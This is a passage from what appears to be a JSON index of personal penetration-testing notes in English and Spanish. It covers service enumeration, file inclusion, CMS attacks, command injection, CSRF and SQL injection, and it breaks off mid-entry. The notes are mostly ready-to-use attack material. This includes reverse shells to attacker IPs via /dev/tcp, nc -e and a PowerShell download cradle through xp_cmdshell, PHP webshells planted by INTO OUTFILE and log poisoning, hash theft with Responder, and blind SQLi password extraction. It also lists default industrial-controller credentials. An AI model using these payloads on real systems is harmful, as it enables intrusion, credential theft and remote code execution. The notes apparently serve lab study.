whoami\n\nquerier\\mssql-svc\n\n\nsqsh\nsqsh -S mssql -D MyDB -U DOMAIN\\\\testuser -P MyTestingClearPassword1\n\nmssql commands\nselect IS_SRVROLEMEMBER (​ 'sysadmin'​ ) # check permisions\n\n\nresponder\nsteal hashes of the SQL service account by using xp_dirtree or xp_fileexist.\n\n\n  en kali:\n    responder -I tun0 -rv\n    \n  \n  en windows\n    SQL&gt;exec xp_dirtree '\\\\10.10.14.6\\share\\file'\nSQL&gt;exec xp_fileexist '\\\\10.10.16.2\\share\\file'\n    \n  \n\n\nmssql reverse shell\nSQL&gt; xp_cmdshell powershell iex(new-object net.webclient).downloadstring(\\\"http://10.10.14.6/Invoke-PowerShellTcp.ps1\\\")\n\n\nnmap nse\nms-sql-brute.nse\nms-sql-config.nse\nms-sql-dac.nse\nms-sql-dump-hashes.nse\nms-sql-empty-password.nse\nms-sql-hasdbaccess.nse\nms-sql-info.nse\nms-sql-ntlm-info.nse\nms-sql-query.nse\nms-sql-tables.nse\nms-sql-xp-cmdshell.nse\n\n\nMongoDB\n27017 27018\n\nnmap nse\nmongodb-brute.nse\nmongodb-databases.nse\nmongodb-info.nse\n\nver web para sqli\n\nISCSI\n3260\n\n\nnmap nse\niscsi-info.nse\n\niscsiadm\n\niscsiadm -m discovery -t sendtargets -p 10.10.10.12\n\n\nSAP ROUTER\n3299\n\nTODO\n\nMySQL\n3306\n\n\nshell\nIf we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.\necho -n \"&lt;?php phpinfo(); ?&gt;\" | xxd -ps 3c3f70687020706870696e666f28293b203f3e\n\nselect 0x3c3f70687020706870696e666f28293b203f3e into outfile \"/var/www/html/blogblog/wp-content/uploads/phpinfo.php\"\n\nor\nSELECT \"&lt;?php passthru($_GET['cmd']); ?&gt;\" into dumpfile '/var/www/html/shell.php';\n\n\ntips\n select sys_exec('/bin/bash');\n bash -p or sudo su\n\nsqsh:\nsqsh program: apt-get install sqsh freetds-bin freetds-common freetds-dev\nusage:\nadd to the bottom of freetds.conf:\n[hostname] host = 192.168.168.169\nport = 2600\ntds version = 8.0\nedit ~/.sqshrc:\n\\set username=sa\n\\set password=password\n\\set style=vert\nconnect: sqsh -S hostname\n\nsqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G​\n\n\nfile inclusion\nIf you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.\n\nselect load_file('/etc/passwd');\n\nnmap nse\nmysql-audit.nse\nmysql-brute.nse\nmysql-databases.nse\nmysql-dump-hashes.nse\nmysql-empty-password.nse\nmysql-enum.nse\nmysql-info.nse\nmysql-query.nse\nmysql-users.nse\nmysql-variables.nse\nmysql-vuln-cve2012-2122.nse\n\n\nLDAP (application layer)\n389\n\n\nLightweight Directory Access Protocol, gestiona el acceso a un servicio de directorios\n\nnmap  nse\n\nldap-rootdse.nse\nldap-search.nse\nldap-brute.nse\n\nldapsearch\n\nldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' \"(objectClass=*)\" \"*\" +\n-h ldap server\n-p port of ldap\n-x simple authentication\n-b search base\n-s scope is defined as base\n\n\n\n  ex2\n    ldapsearch -x -h 10.10.10.100 -p 389 -D ​ 'SVC_TGS'​ -w ​ 'GPPstillStandingStrong2k18'\n-b ​ \"dc=active,dc=htb\"​ -s sub\n\"(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.\n4.803:=2)))\"​ samaccountname | grep sAMAccountName\n    \n  \n\n\nEthernetIP\n44818\n\n\nEs un protocolo industrial que adapta el protocolo cip para automatizaacion de dispositivos industriales.\n\nnmap nse\nenip-enumerate.nse\n\ndefaults\n\n    MicroLogix 1100: Default Username:password is administrator:ml1100\n    MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is MicroLogix 1400 guest:guest is another default password.\n\n\nBACNet\nUDP 47808\n\nBACnet is a communications protocol for Building Automation and Control (BAC) network\n\nnmap nse\nBACnet-discover-enumerate.nse\n\n\nRcomands berkley\n512 513 514\n\nSerie de programas para mandar comandos y loguearse a sistemas unix desde otra computadora por tcp. todo en texto plano\n\nrlogin\nuse auxiliary/scanner/rservices/rlogin_login\nservices -p 513 -u -R\n\n\nrsh\nuse auxiliary/scanner/rservices/rsh_login\nservices -p 514 -u -R\n\nrexec\nauxiliary/scanner/rservices/rexec_login\nservices -p 512 -u -R\n\n\nPostgreSQL\n5432\n\n\nnmap nse\npgsql-brute.nse\n\n\nApple Filing Protocol-appletalk (presentation layer)\n548\n\nProtocolo para intercambio de archivos y recursos en macos\n\nnmap\nafp-brute.nse\nafp-ls.nse\nafp-path-vuln.nse\nafp-serverinfo.nse\nafp-showmount.nse\n\n\nRTSP\n554\n\nReal Time Streaming Protocol, se usa para controlar sesiones multimedia (play, stop, pause,etc)\n\nej client: curl, vlc,skype,spotify,youtube\n\nnmap\n$ nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV\n\n\n$ rtsp-url-brute.nse\n\n\nCameradar\nAn RTSP surveillance camera access multitool\n\nHPDataProtectorRCE\n5555\n\nTODO\n\nVNC\n5900\n\n\nvnc password\necho MYVNCPASSWORD | vncpasswd -f &gt; ~/.secret/passvnc\nWarning: password truncated to the length of 8.\n\ncat ~/.secret/passvnc\nkRS�ۭx8\n\n\nvncviewer hostname-of-vnc-server -passwd ~/.secret/passvnc\n\n\n\nX11\n6000\n\n\nxspy\nxspy 10.9.xx.xx\n\n\nxdpyinfo\nxdpyinfo -display &lt;ip&gt;:&lt;display&gt;\n\n\nxwd\nscreenshot\nxwd -root -display 10.20.xx.xx:0 -out xdump.xdump\n\nXWatchwin\nlive view\n ./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo\n./xwatchwin 10.9.xx.xx:0 -w 0x45\n\n\nRedis\n6379\n\nTODO\n\nFinger\n79\n\nla aplicacion finger es como who.\nel protocolo te deja ver datos de usuarios\n\nroot@kali:~#  finger  root  10.10.10.15\n\n\npodemos bruteforcear el rlogin  de 79\nhydra -L rlogin-users.txt -P rockyou.txt rlogin://osiris.acme.com\n\no incluso antes armar una lista\nfor i in $(cat /usr/share/wordlists/fuzzdb/wordlists-user-passwd/names/namelist.txt) ;do finger $i 10.10.10.76 &gt;&gt; finger-bruteforce.out;done\n\n\nNSE\nfinger.nse\n\n\nSIP\n##5060\n—\nSipvicious\nSIP VoIP phones info\n svmap 10.10.10.7\n\n svwar -m INVITE -e100-300 10.10.10.7\n EXTENSION 233 PROBABLY EXIST\n\nElastix Exploit needs the extension.\n https://www.exploit-db.com/exploits/18650/\nbeep privesc after elastix exploit\n&gt; sudo nmap --interactive\n&gt; !sh\n\n\nrsync\n873\n\nif the remote host runs an rsync daemon, rsync clients can connect by opening a socket on TCP port 873\n\nnmap nse\nrsync-list-modules.nse\n\nKerberos\n88\n\nKerberos is a client server authentication protocol used by Windows Active Directory which\nprovides mutual authentication to all partie\nNSE\nkrb5-enum-users.nse\n\nTODO\n\nPJL\n9100\n\nnmap nse\npjl-ready-message.nse\n\n\nApache Cassandra\n9160\n\nnmap nse\ncassandra-info.nse\ncassandra-brute.nse\n\n\nMulticast DNS (mDNS)\nUDP 5353\n\n\nndmp\n10000 Network Data Management Protocol\n\nNDMP, or Network Data Management Protocol, is a protocol meant to transport data between network attached storage (NAS)\n\nnmap\nndmp-fs-info.nse\nndmp-version"
					}

					
				
			
		
			
				
					,
					

					"2-web-0-initial-enumeration": {
						"id": "2-web-0-initial-enumeration",
						"title": "initial methodology",
						"category": "",
						"url": " /2-web/0-initial-enumeration/",
						"content": "1. fingerprinting\n2. fuzzing\n3. html analyzis\n4. check\n\n  what webserver?\n  what backend?\n  what methods can use?\n  any link or hints in html source?\n  any admin panel?\n  default credentials?\n  hostname change anything?\n\n\n1 Finerprinting\n\nnikto\nnikto -C all -h http://IP\n\nnikto -h $host  -p $puerto\n\n\nhttprint\n  httprint -h www1.example.com -s signatures.txt\n\n\nwhatweb\nwhatweb http://nop.sh\n\n\nWAFW00F\n\nallows one to identify and fingerprint Web Application Firewall (WAF) products protecting a website.\n\nhttps://github.com/EnableSecurity/wafw00f\n\nbanner grabbing with nc\n  nc 192.168.0.10 80\n  GET / HTTP/1.1\n  Host: 192.168.0.10\n  User-Agent: Mozilla/4.0\n  Referrer: www.example.com\n  &lt;enter&gt;\n  &lt;enter&gt;\n\n\n2. Fuzzing\n\nDirB\ndirb http://IP:PORT /usr/share/dirb/wordlists/common.txt\n\nffuf\nffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt\n\nGoBuster\n gobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://10.10.10.56:80\n\ngobuster dir -f -r -k   --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html -u http://10.10.10.56:80/cgi-bin/\n\n\nwfuzz\n\n  fuzz - /usr/share/wfuzz/wordlist/\n\n\nLists\n\n  SecList - /usr/share/seclists/\n  DirB - /usr/share/dirb/wordlists/\n  fuzz - /usr/share/wfuzz/wordlist/\n\n\n3. html analysis\n\n\nlinkfinder\nbusca links en .js files\n\nhtml2text\nhtml -&gt; texto leible\n\ncewl\ncewl http://192.168.168.168/index.html -m 2 -w cewl.lst\n\n\nVARIOS\n\n\nshellshock\n\nvuln en apache con mod_cgi, le apendeas gilada a bash\npodes tener en otras cosas que no sean apache tipo webmin\n\nApache\n\n  encontrar /cgi-bin/\n  encontrar el archivo ahi\n  curl -H “X-Frame-Options: () { :;};echo;echo gato” 10.10.10.56/cgi-bin/user.sh\nwebmin reverse shellshock shell\n    User-Agent: () {:;}; bash  -i &gt;&amp; /dev/tcp/10.10.15.1/1337 0&gt;&amp;1\n    \n  \n\n\nHeartbleed\nTODO\n\ndownload web with httrack\nhttrack partidopirata.com.ar\n\n\nWEBDAV\n\ndavtest\n  davtest –url http://(target IP) – will display what is executable\n\ncadaver\n  cadaver http://(target IP), then run “ls” to list directories found"
					}

					
				
			
		
			
				
					,
					

					"2-web-lfi-rfi": {
						"id": "2-web-lfi-rfi",
						"title": "Local and Remote file inclusion",
						"category": "",
						"url": " /2-web/LFI-RFI/",
						"content": "1 Local File inclusion\n\n\n  linux:\n        https://insecure-website.com/loadImage?filename=../../../etc/passwd\n    \n  \n  windows\n    http://target.com/?page=c:\\windows\\system32\\drivers\\etc\\hosts\nhttp://webserver:ip/index.html?../../../../../boot.ini\n\n    \n  \n\n\nLog Poisoning\n\n\n  web log poisoning\n    nc 10.10.10.14 80\n&lt;?php echo '&lt;pre&gt;' . shell_exec($_GET['cmd'])  . '&lt;/pre&gt;'; ?&gt;\n    \n  \n  linux\n    curl http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00&amp;Submit=Submit\n    \n  \n  windows\n    curl http://10.10.10.14/menu.php?file=c:\\xamp\\apache\\logs\\access.log&amp;cmd=ls\n    \n  \n\n\nSSH log posioning\nhttp://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/\n\nMail log\nLFI /var/mail/\n\ntelnet &lt;IP&gt; 25  \nEHLO &lt;random character&gt;  \n\nVRFY &lt;user&gt;@localhost  \n\nmail from:attacker@attack.com  \nrcpt to: &lt;user&gt;@localhost  \ndata  \n\nSubject: title  \n\n&lt;?php echo system($_REQUEST[cmd]); ?&gt;  \n\n&lt;end with .&gt;  \n\n\n\n2 Remote File Inclusion\n\n\nrequires allow_url_fopen=On and allow_url_include=On\n\n$incfile = $_REQUEST[\"file\"];  \ninclude($incfile.\".php\");  \n\n\n\n\n  original\n    http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=FR&amp;Submit=Submit\n    \n  \n  modificado\n    http://10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php&amp;Submit=Submit\n    \n  \n\n\nseguro nos tira un problema  tratando de ejecutar evil.txt.php, asi que podemos usar un nullbyte para que no appenda el .php\n10.10.0.1/addguestbook.php?name=Test&amp;comment=Which+lang%3F&amp;LANG=http://10.10.10.10./evil.php%00&amp;Submit=Submit\n\n\nweb shell rfi\ncat shell.php\n&lt;?=`$_GET[0]`?&gt;\n\nhttp://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&amp;0=dir\n\n\n3 Common obstacules\n\n\n  just the path\n        filename=/etc/passwd\n    \n  \n  stripped non recursive\n    filename=....//....//....//etc/passwd\n    \n  \n  encoding\n     filename=..%252f..%252f..%252fetc/passwd\n    \n  \n  validation of start path\n     filename=/var/www/images/../../../etc/passwd\n    \n  \n  add nullbyte\n     filename=..%252f..%252f..%252fetc/passwd%00\n    \n  \n\n\n4 common LFI to RCE\n\n\n1. Using file upload forms/functions\nupload a shell,  then\nhttp://example.com/index.php?page=path/to/uploaded/file.php\n\n\n2. Using the PHP wrapper expect://command\nif the app use an include:\n&lt;?php  \ninclude $_GET['page'];  \n?&gt;  \n\nhttp://target.com/index.php?page=expect://whoami  \n\n3. Using php wrapper file://\nhttp://localhost/include.php?page=file:///path/to/file.ext\n\n4. Using the PHP wrapper php://filter\nhttp://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc\nhttp://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc\nhttp://localhost/include.php?page=php://filter/resource=/etc/passwd\n\n5. Using PHP input:// stream\nPOST\n/fi/?page=php://input&amp;cmd=ls\n\n6. Using data://text/plain;base64,command\ndata://text/plain;base64,[command encoded in base64]\nor\ndata://text/plain,&lt;?php shell_exec($_GET['cmd']);?&gt;  \n\nex:\nhttp://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=  \nhttp://example.com/Keeper.php?page=data://text/plain,&lt;?system('id');?&gt;  \n\n7. Using /proc/self/environ\nAnother popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.\n\nOur main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.\ncurl http://secureapplication.example/index.php?view=../../../proc/self/environ\n\nresponse:\nHTTP_USER_AGENT=\"curl/\" &lt;/body&gt;\n\nso we can inject shit like a webshell\ncurl -H \"User-Agent: &lt;?php system('wget http://10.10.14.6/webshell.php -O webshell.php')\" http://target.com\n\ncurl http://target.com/webshell.php&amp;cmd=ls\n\n\n\n8. Using /proc/self/fd\nbrute force the fd until you see “referer”\n/proc/self/fd/{number}\nthen\ncurl -H \"Referer: &lt;?php phpinfo(); ?&gt;\" http://target.com\n\n\n9. Using zip\nUpload a ZIP file containing a PHP shell compressed and access:\nexample.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php\n\n10. Using log files with controllable input like:\n  . /var/log/apache/access.log\n  . /var/log/apache/error.log\n  . /var/log/vsftpd.log\n  . /var/log/sshd.log\n  . /var/log/mail\n\n\n5 Common files location\n\n\nhttps://wiki.apache.org/httpd/DistrosDefaultLayout\nCommon log file location\nUbuntu, Debian\n/var/log/apache2/error.log  \n/var/log/apache2/access.log  \n\nRed Hat, CentOS, Fedora, OEL, RHEL\n/var/log/httpd/error_log  \n/var/log/httpd/access_log  \n\nFreeBSD\n/var/log/httpd-error.log  \n/var/log/httpd-access.log  \n\nCommon Config file location\n\ncheck any restriction or hidden path on accessing the server\n\nUbuntu\n/etc/apache2/apache2.conf  \n/etc/apache2/httpd.conf  \n/etc/apache2/apache2.conf  \n/etc/httpd/httpd.conf  \n/etc/httpd/conf/httpd.conf  \n\nFreeBSD\n/usr/local/etc/apache2/httpd.conf  \n\nHidden site?  \n/etc/apache2/sites-enabled/000-default.conf  \n\n\nroot/user ssh keys? .bash_history?\n/root/.ssh/id_rsa\n/root/.ssh/id_rsa.keystore\n/root/.ssh/id_rsa.pub\n/root/.ssh/authorized_keys\n/root/.ssh/known_hosts\n\nResources\nhttps://www.php.net/manual/en/wrappers.file.php"
					}

					
				
			
		
			
				
					,
					

					"2-web-cms": {
						"id": "2-web-cms",
						"title": "CMSs",
						"category": "",
						"url": " /2-web/cms/",
						"content": "1 Wordpress\n\n\nwpscan\n\n  wpscan --url http://sandbox.local  --enumerate ap,at,cb,dbe -o sandbox.out\n\n\n  ./wpscan –url http://IP/ –enumerate p\n\na veces conviene usar el modo agressive de wpscan\n\nwordpress password cracker\n\nhttps://github.com/MrSqar-Ye/wpCrack.git\n\nwordpress reverse shell admin panel\n\n  create php code\n\n\n&lt;?php\n\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1'\");\n?&gt;\n\n\n\n  zip the php\n  upload the zip as plugin\n  activate plugin\n\n\n2 Joomla\n\nip/administrator/manifests/files/joomla.xml &lt;- te da la version\n\njoomscan\n\njoomscan -ec -u  http://curling.htb\n\n\n3 DRUPAL\n\nhttps://github.com/dreadlocked/Drupalgeddon2\n\ndroopescan scan drupal -u 10.10.10.102:80"
					}

					
				
			
		
			
				
					,
					

					"2-web-command-injection": {
						"id": "2-web-command-injection",
						"title": "command injection",
						"category": "",
						"url": " /2-web/command-injection/",
						"content": "1.0 Command injection\n\n\nSi la aplicacion ejecuta comandos de sistema en funcion del input de usuario y este no esta sanitizado, se pueden correr comandos en el servidor\n  ej:\n\n  https://vulnerable.io/test.php?id=1 &amp;&amp; nc -e /bin/sh 130.10.10.16 4444\n\n\n\nen javascript si usas\n  eval(), setTimeout(), setInterval(), Function() tmb se puede hacer injeccion de js\n\n  process.kill(process.pid)"
					}

					
				
			
		
			
				
					,
					

					"2-web-csrf": {
						"id": "2-web-csrf",
						"title": "CSRF",
						"category": "",
						"url": " /2-web/csrf/",
						"content": "CSRF (portswigger)\n\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.\n\nfor CSRF we need:\n\n  relevant action\n  cookie based session handling: Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests.\n  No unpredictable request parameters: The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess.\n\n\nHTTP request example\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 30\nCookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE\n\nemail=wiener@normal-user.com\n\n\nattack example\n&lt;html&gt;\n  &lt;body&gt;\n    &lt;form action=\"https://vulnerable-website.com/email/change\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n\n\ncsrf token bypass example\n\nsome apps validate only post methods\n\nGET /email/change?email=pwned@evil-user.net HTTP/1.1\nHost: vulnerable-website.com\nCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\n\n\nbypass if the app depends on the token being present\nPOST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 25\nCookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\n\nemail=pwned@evil-user.net\n\n\nbypass if the token is not tied to the user session:\n In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.\n\nCSRF token is tied to a non-session cookie\n  In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:\n\nThis situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim’s browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.\n\n   POST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nCookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv\n\ncsrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com\n\nCSRF token is simply duplicated in a cookie\n some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.\n POST /email/change HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 68\nCookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa\n\ncsrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com\n\n\nIn this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack.\n\nReferer-based defenses against CSRF\neasey to change the referer\n &lt;meta name=\"referrer\" content=\"never\"&gt;\n http://attacker-website.com/csrf-attack?vulnerable-website.com\n\nIf the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:\n\nhttp://vulnerable-website.com.attacker-website.com/csrf-attack\n\nprevention\n. using csrf token and validation for every methods Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used."
					}

					
				
			
		
			
				
					,
					

					"2-web-sqli": {
						"id": "2-web-sqli",
						"title": "SQL Injections",
						"category": "",
						"url": " /2-web/sqli/",
						"content": "Intro\n\n\nClasses\n\n  INBOUND\n    &gt;   data is extracted using the same channel that is used to inject the SQL code.\n  OUT OF BAND\n    &gt;   data is retrieved using a different channel\n  INFERENTIAL\n    &gt;  there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behaviour\n\n\nTypes\n\n  Error-based \n    &gt; the webpage show us an error\n  Union-based \n    &gt; The SQL UNION is used to combine the results of two or more SELECT SQL statements into a single result.\n  Blind-sql-injection \n    &gt; check with time or different information showing\n\n\nmethodology\n\n  Identify injection and Injection type (with strings  use ‘ with numbers  dont)\n  Attack Error based\n  Attack Union based\n  Attack Blind\n\n\n1 Error based SQL\n\ncase 1 MSSQL\nhttp://[site]/page.asp?id=1 or 1=convert(int,(USER))--\n\n\n  respuesta\n    Syntax error converting the nvarchar value 'nombre_de_usuario' to a column of data type int\n    \n    Grab the database user with USER\nGrab the database name with DB_NAME\nGrab the servername with @@servername\nGrab the Windows/OS version with @@version\n  \n\n\nCase 2 MSSQL\nhttps://www.exploit-db.com/papers/12975/\n\n\n  Enumerate column and table name\n    http://www.example.com/page.asp?id=1' HAVING 1=1--\nError message: Column 'news.news_id' is invalid                 &lt; table_name.column\n    \n    http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--\nError message: Column 'news.news_author' is invalid           &lt; table_name.column2\n    \n    http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--\nError message: Column 'news.news_detail' is invalid             &lt; table_name.column3\n    \n    Until no error\n  \n  Enumerate version, db name, users:\n    http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--\nhttp://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--\nhttp://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       &lt;&lt; Is the user running as dbo or sa?\n    \n    xp_cmdshell &lt;&lt; if running as database admin\nhttp://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'\n'; exec master.dbo.xp_cmdshell 'command'\n    \n  \n\n\nOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:\nEXEC sp_configure 'show advanced options', 1;--\nRECONFIGURE;--\nEXEC sp_configure 'xp_cmdshell', 1;--\nRECONFIGURE;--  \n\nOn MSSQL 2000:\nEXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--\n\n\n2  Union based SQLI\n\n\ncase 1 MSSQL\nejemplo :192.168.30.35/comment.php?id=437\n\n?id=738 order by 1\n?id=738 order by 2\n?id=738 order by n\nhasta que aparece un error \" unkown column 7 in order clause\"\n\n\nej 2\n?id=738 union select 1,2,3,4,5,6\n\nej 3\n?id=-1 union select 1,2,3,4,@@version,6\n?id=-1 union select 1,2,3,4,user(),6\n\nej 4\n?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema tables\n\nthen\n?id=-1 union all select 1,2,3,4,column_name,6 FROM information_schema columns where table_name='users'\nesto nos devuelve que hay 4 columnas, id name password y country\n\nthen\nid=-1 union select 1,2,name,4,password,6 FROM users\n\nesto se sluciona deshabilitando error reporting (video 94)\n\ncase 2 MySQL\n\n  enumerate columns\n    http://[site]/page.php?id=1 order by 1/*\nhttp://[site]/page.php?id=1 order by 2/*\nhttp://[site]/page.php?id=1 order by 5/*\n5 gives a valid page\n    \n  \n  union\n    http://[site]/page.php?id=1 union all select 1,2,3,4,5/\ngives a valid page\n    \n    Change the first part of the query to a null or negative value so we can see\n    http://[site]/page.php?id=-1 union all select 1,2,3,4,5/*\nprints only 2 and 3\n    \n  \n  grab info\n    http://[site]/page.php?id=null union all select 1,user(),3,4,5/*\nhttp://[site]/page.php?id=null union all select 1,2,database(),4,5/*\nhttp://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*\n    \n  \n\n\n3 Blind SQLi\n\ncase 1 MSSQL\nhttp://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--\nhttp://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--\nhttp://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--\n...\netc until we wait for 10 secs\n\n\n  to extract the user name:\n    http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'--\nhttp://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;98) WAITFOR DELAY '00:00:10'--\nhttp://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--\nhangs for 10 seconds\nhttp://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'--\nhttp://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)\nhangs for 10 seconds\n    \n    and so on\n  \n\n\npodemos probar\nid=738-sleep(5)  &lt;-si vemos que tarda es por que el input es injectable\nselect IF(MID(@@version,1,1) = '5',SLEEP(5),0)\n\n\ntmb podemos probar con un and para ver si trae o no resultados\nid=6 and 1=1\nid=6 and 1=2\n\nSUPONEMOs que es injectable y buscamos un archivo con load_file\nid=738 union all select 1,2,3,4,load_file(\"c:/windows/system32/drivers/etc/hosts\"),6\n\nCreamos un php\nid=738 union all select 1,2,3,4,\"&lt;?php echo shell_exec($_GET['cmd'];?&gt;\",6 into OUTFILE'c:/xampp/htdocs/backdoor.php'\n\n\nWith blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective\n\nExploiting blind SQL injection by triggering conditional responses\n\nConsider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:\n\nCookie: TrackingId=u5YD3PapBcR4lN3e7Tj4\n\nWhen a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:\nSELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'\n\nThis query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a “Welcome back” message is displayed within the page.\nxyz' UNION SELECT 'a' WHERE 1=1-- &lt;&lt; shows welcome back\nxyz' UNION SELECT 'a' WHERE 1=2--  &lt;&lt; shows nothing\n\ntry to gues the password for Administrator:\nxyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--\nxyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--\n\nWe can continue this process to systematically determine the full password for the Administrator user.\n\nInducing conditional responses by triggering SQL errors\nTo see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:\nxyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--\nxyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--\n\nThese inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the case expression evaluates to NULL, which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application’s HTTP response, we can use this difference to infer whether the injected condition is true.\n\nUsing this technique, we can retrieve data in the way already described, by systematically testing one character at a time:\nxyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) &gt; 'm') then 1/0 else null end from users—\n\nExploiting blind SQL injection by triggering time delays\n'; IF (1=2) WAITFOR DELAY '0:0:10'--\n'; IF (1=1) WAITFOR DELAY '0:0:10'--\n\n\n  attack\n    '; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'—\n    \n  \n\n\nmssql 